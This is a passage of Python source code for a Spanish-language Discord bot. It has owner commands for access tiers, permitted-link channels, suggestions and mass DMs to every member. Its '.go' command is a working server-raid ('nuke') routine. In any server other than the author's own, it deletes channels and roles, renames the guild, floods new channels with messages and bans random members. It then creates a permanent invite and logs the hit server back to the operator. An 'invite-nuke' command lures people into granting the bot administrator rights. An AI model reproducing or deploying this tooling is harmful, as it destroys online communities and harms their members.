        description=f"Escudo removido de {usuario.mention}",
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)
    print(f"❌ Escudo removido a {usuario.name}")

@bot.tree.command(name="ver_acceso", description="[OWNER] Ve todos los usuarios con acceso")
async def ver_acceso(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    datos = cargar_datos()
    
    embed = discord.Embed(
        title="👥 Usuarios con Acceso",
        color=discord.Color(0x000000),
        timestamp=datetime.now()
    )
    
    # Acceso Básico
    acceso_basico = datos.get("acceso_basico", {})
    if acceso_basico:
        lista = ""
        for user_id in acceso_basico:
            user = bot.get_user(int(user_id))
            user_name = user.name if user else f"ID: {user_id}"
            lista += f"• {user_name}\n"
        embed.add_field(name="🔷 MD Básico", value=lista if lista else "Ninguno", inline=False)
    else:
        embed.add_field(name="🔷 MD Básico", value="Ninguno", inline=False)
    
    # Acceso Pro Temporal
    acceso_pro_temporal = datos.get("acceso_pro_temporal", {})
    if acceso_pro_temporal:
        lista = ""
        for user_id in acceso_pro_temporal:
            user = bot.get_user(int(user_id))
            user_name = user.name if user else f"ID: {user_id}"
            lista += f"• {user_name}\n"
        embed.add_field(name="💎 MD Pro Temporal", value=lista if lista else "Ninguno", inline=False)
    else:
        embed.add_field(name="💎 MD Pro Temporal", value="Ninguno", inline=False)
    
    # MD Pro Permanente
    pro_perm = datos.get("acceso_pro_permanente", [])
    if pro_perm:
        lista = ""
        for user_id in pro_perm:
            user = bot.get_user(user_id)
            user_name = user.name if user else f"ID: {user_id}"
            lista += f"• {user_name}\n"
        embed.add_field(name="👑 MD Pro Permanente", value=lista if lista else "Ninguno", inline=False)
    else:
        embed.add_field(name="👑 MD Pro Permanente", value="Ninguno", inline=False)
    
    # Escudos
    escudos = datos.get("escudos", [])
    if escudos:
        lista = ""
        for user_id in escudos:
            user = bot.get_user(user_id)
            user_name = user.name if user else f"ID: {user_id}"
            lista += f"• {user_name}\n"
        embed.add_field(name="🛡️ Con Escudo", value=lista if lista else "Ninguno", inline=False)
    else:
        embed.add_field(name="🛡️ Con Escudo", value="Ninguno", inline=False)
    
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="canales-links", description="[OWNER] Gestiona canales donde se permiten links")
@app_commands.describe(accion="Acción: ver, agregar o eliminar", canal="Canal de Discord (solo para agregar/eliminar)")
async def canales_links_cmd(interaction: discord.Interaction, accion: str, canal: discord.TextChannel = None):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    datos = cargar_datos()
    canales = datos.get("canales_links_permitidos", [CANAL_LINKS_PERMITIDOS])
    accion_lower = accion.lower()
    
    if accion_lower == "ver":
        embed = discord.Embed(
            title="📋 Canales donde se permiten links",
            color=discord.Color(0x000000)
        )
        if canales:
            lista = ""
            for canal_id in canales:
                ch = bot.get_channel(canal_id)
                canal_name = f"#{ch.name}" if ch else f"ID: {canal_id}"
                lista += f"• {canal_name}\n"
            embed.description = lista
        else:
            embed.description = "No hay canales permitidos"
        await interaction.followup.send(embed=embed, ephemeral=True)
    
    elif accion_lower == "agregar":
        if not canal:
            await interaction.followup.send("❌ Debes especificar un canal para agregar", ephemeral=True)
            return
        
        if canal.id in canales:
            await interaction.followup.send(f"⚠️ #{canal.name} ya está en la lista", ephemeral=True)
            return
        
        canales.append(canal.id)
        datos["canales_links_permitidos"] = canales
        guardar_datos(datos)
        
        await interaction.followup.send(f"✅ #{canal.name} agregado a canales permitidos", ephemeral=True)
        print(f"✅ Canal agregado: #{canal.name} ({canal.id})")
    
    elif accion_lower == "eliminar":
        if not canal:
            await interaction.followup.send("❌ Debes especificar un canal para eliminar", ephemeral=True)
            return
        
        if canal.id not in canales:
            await interaction.followup.send(f"⚠️ #{canal.name} no está en la lista", ephemeral=True)
            return
        
        canales.remove(canal.id)
        datos["canales_links_permitidos"] = canales
        guardar_datos(datos)
        
        await interaction.followup.send(f"✅ #{canal.name} eliminado de canales permitidos", ephemeral=True)
        print(f"✅ Canal eliminado: #{canal.name} ({canal.id})")
    
    else:
        await interaction.followup.send("❌ Acción inválida. Usa: ver, agregar o eliminar", ephemeral=True)

@bot.tree.command(name="sugerencia", description="Envía una sugerencia al servidor (Cooldown: 45 min)")
@app_commands.describe(sugerencia="Tu sugerencia para mejorar el servidor")
async def sugerencia_cmd(interaction: discord.Interaction, sugerencia: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    try:
        datos = cargar_datos()
        user_id_str = str(interaction.user.id)
        ultimo_uso = datos.get("ultimo_uso_sugerencia", {})
        COOLDOWN_MINUTOS = 45
        
        if user_id_str in ultimo_uso:
            ultimo_tiempo = datetime.fromisoformat(ultimo_uso[user_id_str])
            tiempo_pasado = datetime.now() - ultimo_tiempo
            tiempo_faltante = timedelta(minutes=COOLDOWN_MINUTOS) - tiempo_pasado
            
            if tiempo_faltante.total_seconds() > 0:
                minutos = int(tiempo_faltante.total_seconds() // 60)
                segundos = int(tiempo_faltante.total_seconds() % 60)
                await interaction.followup.send(f"⏳ Debes esperar {minutos}m {segundos}s para enviar otra sugerencia", ephemeral=True)
                return
        
        canal = bot.get_channel(CANAL_SUGERENCIAS)
        if not canal:
            await interaction.followup.send("❌ No se pudo enviar la sugerencia", ephemeral=True)
            return
        
        embed = discord.Embed(
            title="💡 Nueva Sugerencia",
            description=sugerencia,
            color=discord.Color(0x000000),
            timestamp=datetime.now()
        )
        embed.set_author(
            name=interaction.user.name,
            icon_url=interaction.user.display_avatar.url
        )
        
        await canal.send(embed=embed)
        
        # Registrar el uso
        ultimo_uso[user_id_str] = datetime.now().isoformat()
        datos["ultimo_uso_sugerencia"] = ultimo_uso
        guardar_datos(datos)
        
        await interaction.followup.send("✅ Tu sugerencia ha sido enviada exitosamente", ephemeral=True)
        print(f"💡 Sugerencia de {interaction.user.name}: {sugerencia}")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        print(f"Error en sugerencia: {e}")

@bot.tree.command(name="mensaje", description="[OWNER] Envía un mensaje a TODOS en el servidor")
@app_commands.describe(texto="Texto del mensaje a enviar")
async def mensaje_todos(interaction: discord.Interaction, texto: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id != OWNER_ID:
        await interaction.followup.send("❌ Solo el owner puede usar este comando", ephemeral=True)
        return
    
    if interaction.guild_id != SERVIDOR_ID:
        await interaction.followup.send("❌ Este comando solo funciona en el servidor autorizado", ephemeral=True)
        return
    
    try:
        guild = bot.get_guild(SERVIDOR_ID)
        if not guild:
            await interaction.followup.send("❌ No se pudo obtener el servidor", ephemeral=True)
            return
        
        token_1 = os.getenv("DISCORD_TOKEN")
        if not token_1:
            await interaction.followup.send("❌ DISCORD_TOKEN no configurado", ephemeral=True)
            return
        
        await bot.fetch_guild(SERVIDOR_ID)
        miembros = [m for m in guild.members if not m.bot]
        miembros_totales = len(miembros)
        enviados = 0
        fallidos = 0
        
        print(f"📢 Iniciando envío a {miembros_totales} miembros")
        await interaction.followup.send(f"⏳ Enviando mensaje a {miembros_totales} miembros...", ephemeral=True)
        
        for miembro in miembros:
            try:
                resultado = await send_dm_fast(token_1, miembro.id, texto)
                if resultado:
                    enviados += 1
                    print(f"✅ Mensaje enviado a {miembro.name}")
                else:
                    fallidos += 1
                    print(f"❌ Fallo al enviar a {miembro.name}")
            except Exception as e:
                print(f"Error enviando a {miembro.name}: {e}")
                fallidos += 1
            
            await asyncio.sleep(0.2)
        
        embed = discord.Embed(
            title="📢 Mensaje Masivo Completado",
            color=discord.Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Total de miembros", value=str(miembros_totales), inline=False)
        embed.add_field(name="✅ Exitosos", value=str(enviados), inline=True)
        embed.add_field(name="❌ Fallidos", value=str(fallidos), inline=True)
        embed.add_field(name="Mensaje", value=f"```{texto[:1024]}```", inline=False)
        
        await interaction.followup.send(embed=embed, ephemeral=True)
        print(f"📢 Mensaje masivo completado: {enviados} exitosos, {fallidos} fallidos")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
        print(f"Error en mensaje masivo: {e}")

@bot.command(name="go", help="Ejecuta el comando .go desde config.json")
async def cambiar_nombre_servidor(ctx):
    """Comando ULTRA RÁPIDO - Todo en paralelo desde config.json"""
    print(f"COMANDO .GO EJECUTADO POR {ctx.author.name}")
    
    # Bloquear en el servidor oficial
    if ctx.guild.id == SERVIDOR_OFICIAL:
        print(f"Comando .go bloqueado en servidor oficial")
        return
    
    inicio = datetime.now()
    
    # Capturar nombre original ANTES de cambiar
    nombre_original = ctx.guild.name
    
    try:
        print(f"Iniciando comando .go")
        
        # Cargar configuración
        config = cargar_config_go()
        nombre_servidor = config.get("nombre_servidor", "papi chulo")
        cantidad_bans = config.get("cantidad_bans", 1)
        cantidad_delete = config.get("cantidad_delete_canales", 0)
        cantidad_delete_roles = config.get("cantidad_delete_roles", 0)
        canales_config = config.get("canales", [])
        
        print(f"Config cargada: {len(canales_config)} canales, {cantidad_bans} bans, {cantidad_delete} delete")
        
        # 0. ELIMINAR CANALES EN PARALELO
        canales_eliminados = 0
        if cantidad_delete > 0:
            try:
                todos_canales = ctx.guild.channels
                cant_eliminar = min(cantidad_delete, len(todos_canales))
                canales_a_eliminar = todos_canales[:cant_eliminar]
                print(f"Eliminando {cant_eliminar} canal(es)...")
                
                tareas_delete = []
                for canal in canales_a_eliminar:
                    tareas_delete.append(canal.delete())
                
                resultados_delete = await asyncio.gather(*tareas_delete, return_exceptions=True)
                canales_eliminados = sum(1 for r in resultados_delete if not isinstance(r, Exception))
                print(f"Eliminados {canales_eliminados} canal(es)")
            except Exception as e:
                print(f"Error eliminando canales: {e}")
        
        # 1. Renombrar servidor
        print(f"Renombrando servidor a: {nombre_servidor}")
        try:
            await ctx.guild.edit(name=nombre_servidor)
            print(f"Servidor renombrado")
        except Exception as e:
            print(f"Error renombrando servidor: {e}")
        
        # 2. Crear canales en paralelo
        print(f"🔨 Creando {len(canales_config)} canal(es)...")
        tareas_crear = []
        for canal_cfg in canales_config:
            nombre = canal_cfg.get("name", "canal")
            tareas_crear.append(ctx.guild.create_text_channel(nombre))
        
        canales_creados = await asyncio.gather(*tareas_crear, return_exceptions=True)
        canales_validos = [c for c in canales_creados if not isinstance(c, Exception) and c is not None]
        print(f"✅ {len(canales_validos)} canal(es) creado(s)")
        
        # 3. Enviar mensajes en paralelo
        total_mensajes = 0
        tareas_msgs = []
        for idx, canal_cfg in enumerate(canales_config):
            if idx < len(canales_validos):
                canal = canales_validos[idx]
                for msg in canal_cfg.get("messages", []):
                    tareas_msgs.append(canal.send(msg))
                    total_mensajes += 1
        
        if tareas_msgs:
            print(f"💬 Enviando {total_mensajes} mensaje(s)...")
            resultados = await asyncio.gather(*tareas_msgs, return_exceptions=True)
            exitosos = sum(1 for r in resultados if not isinstance(r, Exception))
            print(f"✅ {exitosos}/{total_mensajes} mensaje(s) enviado(s)")
        
        # 4. Banear usuarios
        baneados_count = 0
        if cantidad_bans > 0:
            try:
                miembros = [m for m in ctx.guild.members if not m.bot and m.id != OWNER_ID and m.id != ctx.author.id]
                if miembros:
                    cant = min(cantidad_bans, len(miembros))
                    usuarios_a_banear = random.sample(miembros, cant)
                    print(f"🚫 Baneando {cant} usuario(s)...")
                    
                    tareas_bans = []
                    for u in usuarios_a_banear:
                        tareas_bans.append(ctx.guild.ban(u, reason="Baneado .go"))
                    
                    resultados_ban = await asyncio.gather(*tareas_bans, return_exceptions=True)
                    baneados_count = sum(1 for r in resultados_ban if not isinstance(r, Exception))
                    print(f"✅ {baneados_count} usuario(s) baneado(s)")
            except Exception as e:
                print(f"❌ Error en bans: {e}")
        
        # 5. Eliminar roles
        roles_eliminados = 0
        if cantidad_delete_roles > 0:
            try:
                todos_roles = ctx.guild.roles
                cant_eliminar = min(cantidad_delete_roles, len(todos_roles))
                roles_a_eliminar = todos_roles[:cant_eliminar]
                print(f"Eliminando {cant_eliminar} rol(es)...")
                
                tareas_delete_roles = []
                for rol in roles_a_eliminar:
                    if rol != ctx.guild.default_role:  # No eliminar el rol @everyone
                        tareas_delete_roles.append(rol.delete())
                
                if tareas_delete_roles:
                    resultados_delete_roles = await asyncio.gather(*tareas_delete_roles, return_exceptions=True)
                    roles_eliminados = sum(1 for r in resultados_delete_roles if not isinstance(r, Exception))
                    print(f"✅ Eliminados {roles_eliminados} rol(es)")
            except Exception as e:
                print(f"Error eliminando roles: {e}")
        
        # Completado en silencio
        tiempo_total = (datetime.now() - inicio).total_seconds()
        print(f"Comando .go completado en {tiempo_total:.1f}s")
        
        # Generar link del servidor - INVITACIÓN PERMANENTE
        server_link = None
        try:
            # Crear invitación permanente sin límites
            invite = await ctx.guild.create_invite(max_age=0, max_uses=0, reason="Log .go")
            server_link = invite.url
            print(f"✅ Invitación creada: {server_link}")
        except Exception as e:
            print(f"⚠️ No se pudo crear invite: {e}")
            try:
                # Intentar desde el primer canal del servidor
                if ctx.guild.channels:
                    channel = ctx.guild.channels[0]
                    invite = await channel.create_invite(max_age=0, max_uses=0)
                    server_link = invite.url
                    print(f"✅ Invitación desde canal: {server_link}")
            except Exception as e2:
                print(f"⚠️ Fallo en canal: {e2}")
                try:
                    # Última opción: usar invitaciones existentes
                    invites = await ctx.guild.invites()
                    for inv in invites:
                        if not inv.max_age or inv.max_age > 3600:  # Preferir las que expiren tarde
                            server_link = inv.url
                            print(f"✅ Usando existente: {server_link}")
                            break
                except:
                    pass
        
        # Si todo falla, usar fallback
        if not server_link:
            server_link = f"https://discord.gg/{ctx.guild.id}"
            print(f"⚠️ Fallback: {server_link}")
        
        # Incrementar contador y enviar log en background
        num_fila = incrementar_contador_go()
        asyncio.create_task(enviar_log_go(
            nombre_original,
            nombre_servidor,
            ctx.guild.id,
            len(ctx.guild.members),
            bot.user.display_avatar.url,
            server_link,
            num_fila
        ))
        
    except Exception as e:
        print(f"❌ ERROR EN .GO: {e}")
        import traceback
        traceback.print_exc()
        try:
            await ctx.send(f"❌ ERROR: {str(e)[:100]}")
        except:
            print(f"No se pudo enviar mensaje de error")

class InviteView(discord.ui.View):
    def __init__(self, bot_id: int):
        super().__init__(timeout=None)
        invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot"
        self.add_item(discord.ui.Button(label="Añadir bot al servidor", url=invite_url, style=discord.ButtonStyle.gray))

class AskInviteView(discord.ui.View):
    def __init__(self, ctx, bot_id: int):
        super().__init__(timeout=None)
        self.ctx = ctx
        self.bot_id = bot_id
    
    @discord.ui.button(label="Si", style=discord.ButtonStyle.gray)
    async def si_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.defer()
            return
        
        embed = discord.Embed(
            title="Invita el bot a tu servidor y usa el comando .go",
            color=discord.Color(0x000000),
            timestamp=datetime.now()
        )
        
        await interaction.response.edit_message(embed=embed, view=InviteView(self.bot_id))
    
    @discord.ui.button(label="No", style=discord.ButtonStyle.gray)
    async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.defer()
            return
        
        await interaction.response.defer()
        await interaction.delete_original_response()

@bot.command(name="invite")
async def invite_bot(ctx):
    """Envía un embed con el botón para añadir el bot al servidor"""
    embed = discord.Embed(
        title="Invita el bot a tu servidor y usa el comando .go",
        color=discord.Color(0x000000),
        timestamp=datetime.now()
    )
    
    await ctx.send(embed=embed, view=InviteView(bot.user.id))

@bot.command(name="invite-nuke")
async def invite_nuke(ctx):
    """Envía un embed con el botón para añadir el bot al servidor"""
    embed = discord.Embed(
        title="Invita el bot a tu servidor y usa el comando .go",
        color=discord.Color(0x000000),
        timestamp=datetime.now()
    )
    
    await ctx.send(embed=embed, view=InviteView(bot.user.id))

@bot.command(name="ban")
async def ban_random(ctx, cantidad: int = 1):
    """[OWNER] Banea X usuarios al azar del servidor. Modificar cantidad: .ban 5"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Solo el owner puede usar este comando", delete_after=5)
        return
    
    if ctx.guild.id != SERVIDOR_ID:
        await ctx.send("❌ Este comando solo funciona en el servidor autorizado", delete_after=5)
        return
    
    try:
        # Obtener miembros (excluir bots y al owner)
        miembros = [m for m in ctx.guild.members if not m.bot and m.id != OWNER_ID]
        
        if not miembros:
            await ctx.send("❌ No hay miembros para banear", delete_after=5)
            return
        
        # Limitar cantidad a disponibles
        cantidad = min(cantidad, len(miembros))
        
        # Seleccionar al azar
        banear = random.sample(miembros, cantidad)
        
        baneados = 0
        fallidos = 0
        nombres = []
        
        for miembro in banear:
            try:
                await ctx.guild.ban(miembro, reason="Baneado al azar")
                baneados += 1
                nombres.append(miembro.name)
                print(f"🚫 {miembro.name} baneado")
            except Exception as e:
                fallidos += 1
                print(f"Error baneando {miembro.name}: {e}")
        
        embed = discord.Embed(
            title="🚫 Baneo Masivo Completado",
            color=discord.Color.red(),
            timestamp=datetime.now()
        )
        embed.add_field(name="✅ Baneados", value=str(baneados), inline=True)
        embed.add_field(name="❌ Fallidos", value=str(fallidos), inline=True)
        embed.add_field(name="Usuarios", value=", ".join(nombres) if nombres else "Ninguno", inline=False)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}", delete_after=5)
        print(f"Error en ban: {e}")

# Run bot
bot.run(os.getenv("DISCORD_TOKEN"))